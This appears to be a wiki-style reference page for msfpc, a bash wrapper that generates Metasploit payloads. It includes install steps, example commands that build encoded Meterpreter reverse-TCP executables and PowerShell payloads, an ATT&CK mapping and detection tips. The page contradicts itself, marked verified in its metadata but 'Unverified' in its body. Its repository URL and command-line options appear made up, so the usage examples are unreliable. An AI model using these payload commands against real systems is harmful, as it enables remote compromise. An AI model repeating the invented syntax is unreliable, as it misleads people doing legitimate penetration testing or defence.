---
id: 6d22adf0-d9d7-4e2f-87e7-f660313f04ed
name: msfpc
type: tool
verified: true
created_at: '2019-08-28T21:17:36.192982+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Linux
  - Windows
  - macOS
tags:
  - payload-generation
  - msfvenom
  - metasploit
  - exploitation
url: 'https://github.com/gpshead/msfpc'
validated: true
---

# msfpc

**Status**: Unverified

## Overview

MSFvenom Payload Creator (MSFPC) is a bash wrapper script designed to simplify the generation of payloads using msfvenom from the Metasploit Framework. It allows users to create multiple payload formats with minimal input, automating common options like IP selection, encoding, and Metasploit resource file creation. Commonly used in penetration testing for generating reverse shells, bind shells, and other exploits across platforms like Windows, Android, and Linux.

## Description

MSFPC streamlines payload creation by providing an interactive menu for selecting LHOST, LPORT, platform, and architecture. It supports batch generation of multiple formats (e.g., EXE, APK, Python scripts) and integrates directly with Metasploit by producing .rc files for automated handler setup. This reduces manual configuration errors and speeds up red team operations, especially when testing evasion techniques or multi-vector attacks.

## Features

- Feature 1: Interactive IP and port selection menu for ease of use.
- Feature 2: Support for multiple payload architectures (x86, x64, ARM) and formats (EXE, DLL, APK, PS1, PY).
- Feature 3: Automatic generation of Metasploit resource files (.rc) to launch handlers.
- Feature 4: Encoding options (Shikata GaNai, etc.) and bad character avoidance.
- Feature 5: Batch mode for producing payloads in various formats simultaneously.
- Feature 6: Embed payloads into existing files (e.g., legitimate APKs).

## Installation

### Requirements

- Metasploit Framework installed (includes msfvenom).
- Bash environment (Linux/macOS preferred; works on Windows via Git Bash or WSL).
- Git for cloning the repository.

### Install Commands

```bash
# Clone the repository
sudo git clone https://github.com/gpshead/msfpc.git /opt/msfpc

# Make executable
sudo chmod +x /opt/msfpc/msfpc

# Add to PATH (optional)
echo 'export PATH=$PATH:/opt/msfpc' >> ~/.bashrc
source ~/.bashrc

# For Kali Linux (often pre-configurable via apt, but manual install recommended for latest)
sudo apt update && sudo apt install metasploit-framework
git clone https://github.com/gpshead/msfpc.git ~/msfpc
cd ~/msfpc && chmod +x msfpc
```

On Windows: Use MSYS2 or WSL, install Metasploit via official installer, then clone as above.

## Basic Usage

```bash
msfpc --help
```

This displays all available options and examples.

### Common Options

| Option | Description |
|--------|-------------|
| -h, --help | Show help message and exit |
| -p | Specify payload (e.g., windows/meterpreter/reverse_tcp) |
| -l | Language (e.g., us, fr) |
| -t | Target architecture (e.g., exe, elf) |
| -f | Output format (e.g., exe, apk, ps1) |
| -n | LHOST (attacker IP) |
| -P | LPORT (attacker port) |
| -o | Output filename |
| -s | Add encoding (Shikata GaNai) |
| -b | Bad characters to avoid |

## Examples

### Example 1: Basic Usage

Generate a simple Windows reverse TCP payload:

```bash
msfpc -p windows/meterpreter/reverse_tcp -l us -t exe -n 192.168.1.100 -P 4444 -f exe -o payload.exe
```

This creates payload.exe and a resource.rc file.

### Example 2: Advanced Usage

Batch generate multiple formats with encoding:

```bash
msfpc -p windows/meterpreter/reverse_tcp -l us -t exe -n 192.168.1.100 -P 4444 -f exe,ps1 -o payload -s -e x86/shikata_ga_nai
```

Produces payload.exe, payload.ps1, and resource files.

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Process Injection]] Process Injection (for payload delivery).
- [[Execution through API]] Native API (via Meterpreter payloads).
- [[Obfuscated Files or Information]] Obfuscated Files or Information (encoding options).

### Tactics

- [[Execution]] Execution (payload execution).
- [[Persistence]] Persistence (if payloads establish backdoors).

## Detection

Indicators and methods for detecting this tool's usage:

- Detection method 1: Monitor for msfvenom processes or generated files with Metasploit signatures (e.g., via YARA rules for payloads).
- Detection method 2: Network logs showing connections to common handler ports (e.g., 4444) from encoded binaries.
- Detection method 3: File system scans for .rc files or unusual EXE/APK with embedded Meterpreter stubs.
- Detection method 4: EDR alerts on bash scripts cloning from GitHub or executing msfpc.

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[tools/Metasploit-Framework]]
- [[tools/msfvenom]]

## References

- Official GitHub: https://github.com/gpshead/msfpc
- Metasploit Documentation: https://docs.metasploit.com/
- Payload Encoding Guide: https://www.offensive-security.com/metasploit-unleashed/encoding-payloads/
